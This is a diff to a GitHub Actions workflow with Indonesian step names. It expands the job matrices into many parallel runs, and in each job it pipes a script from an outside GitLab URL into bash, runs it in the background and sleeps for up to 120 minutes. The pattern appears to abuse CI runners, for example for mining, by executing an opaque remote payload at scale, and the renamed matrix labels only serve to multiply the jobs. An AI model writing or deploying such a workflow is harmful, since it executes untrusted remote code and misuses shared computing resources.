@@ -16,8 +16,8 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        build: [A.1, B.1]
-        flag: [A, B, C, D, E, F, G, H, I, J]
+        build: [X.1, Y.1]                                          
+        flag: [Alpha, Beta, Gamma, Delta, Epsilon, Zeta, Eta, Theta, Iota, Kappa]  
     steps:
       - name: hertob
         continue-on-error: true
@@ -29,13 +29,14 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        build: [C.1, C.2, C.3, C.4, C.5, D.1, D.2, D.3, D.4, D.5]
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N]
+        build: [N1, N2, N3, N4, N5, N6, N7, N8, N9, N10]        
+        flag: [Red, Blue, Green, Yellow, Purple, Orange, Pink, Cyan, Magenta, Lime, Teal, Lavender, Maroon, Navy] 
     steps:
-      - name: Jalankan perintah (default)
+      - name: Jalankan perintah (background + sleep 4 menit)
         continue-on-error: true
-        run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }}  &
-           sleep 240s
+        run: |
+          ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }} &
+          sleep 240s
 
   dert:
     needs: [nert]
@@ -43,13 +44,14 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        build: [E.1, F.1, F.2, F.3, F.4, F.5, F.6, F.7]
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L]
+        build: [D1, D2, D3, D4, D5, D6, D7, D8, D9, D10]                 
+        flag: [One, Two, Three, Four, Five, Six, Seven, Eight, Nine, Ten, Eleven, Twelve]  
     steps:
-      - name: dertjob
+      - name: dertjob (background + sleep 18 menit)
         continue-on-error: true
-        run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }}  &
-           sleep 18m
+        run: |
+          ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }} &
+          sleep 12m
 
   mart:
     needs: [dert]
@@ -57,10 +59,11 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        build: [E.1, F.1, F.2, F.3, F.4, F.5, F.6, F.7]
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L]
+        build: [M1, M2, M3, M4, M5, M6, M7, M8]                
+        flag: [Spring, Summer, Autumn, Winter, Monsoon, Dry, Wet, Hot, Cold, Warm, Cool, Mild]  
     steps:
-      - name: dertjob
+      - name: martjob (background + sleep 120 menit)
         continue-on-error: true
-        run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }}  &
-           sleep 120m
+        run: |
+          ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }} &
+          sleep 120m
